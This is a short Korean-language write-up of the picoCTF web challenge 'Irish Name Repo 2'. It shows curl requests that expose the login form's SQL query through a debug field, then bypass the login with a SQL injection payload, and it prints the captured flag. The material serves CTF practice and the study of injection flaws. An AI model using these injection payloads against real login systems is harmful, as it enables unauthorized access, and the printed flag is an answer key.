---
tags:
  - picoCTF
  - SQL-injection
  - Medium
  - web
Date: 2024-09-28T17:07:00
---
# Description
> There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

# Walk-Through

2024.09.27에 풀었던 Irish Name Repo의 두 번째 시리즈다. 똑같이 SQL Injection을 이용해서 풀 수 있는 문제이며 Irish Name Repo 1과 다른 점은 다음이다.
```
╰─$ curl -X POST https://jupiter.challenges.picoctf.org/problem/52849/login.php1\
-d "username=Admin&password=1234&debug=0"
```
Irish Name Repo 1은 간단한 SQL Injection으로 flag를 얻을 수 있었는데 반해 Irish Name Repo 2는 위와 같이 debug 필드가 존재하며 이를 "1"로 설정해 요청을 보내면 서버에서 사용된 SQL이 무엇인지 확인할 수 있다는 점이다.
```
╭─jako@prompt-pro ~/private/git-repo/pjt-java-temp/fastcampus-payment
╰─$ curl -X POST https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=Admin&password=1234&debug=1"
<pre>username: Admin
password: 1234
SQL query: SELECT * FROM users WHERE name='Admin' AND password='1234'
</pre><h1>Login failed.</h1>%
```
생성된 SQL을 보면 name과 paasword 값에 입력된 값이 그대로 적용된다.  또한 Irish Name Repo 1에서 사용된 SQL-Injection Payload를 그대로 사용하면 로그인에 실패한다. 
```
╰─$ curl -X POST https://jupiter.challenges.picoctf.org/problem/52849/login.php \
-d "username=1'-- or 1=1;&password=1234&debug=1"
<pre>username: 1'-- or 1=1;
password: 1234
SQL query: SELECT * FROM users WHERE name='1'-- or 1=1;' AND password='1234'
</pre><h1>SQLi detected.</h1>%
```
입력을 토대로 생성된 SQL을 보니 name 입력 후의 문장을 동작하지 않게 주석 처리해보자.
```
╰─$ curl -X POST https://jupiter.challenges.picoctf.org/problem/52849/login.php \
-d "username=admin'; &password=1234&debug=1"
<pre>username: admin';
password: 1234
SQL query: SELECT * FROM users WHERE name='admin'; ' AND password='1234'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>%
```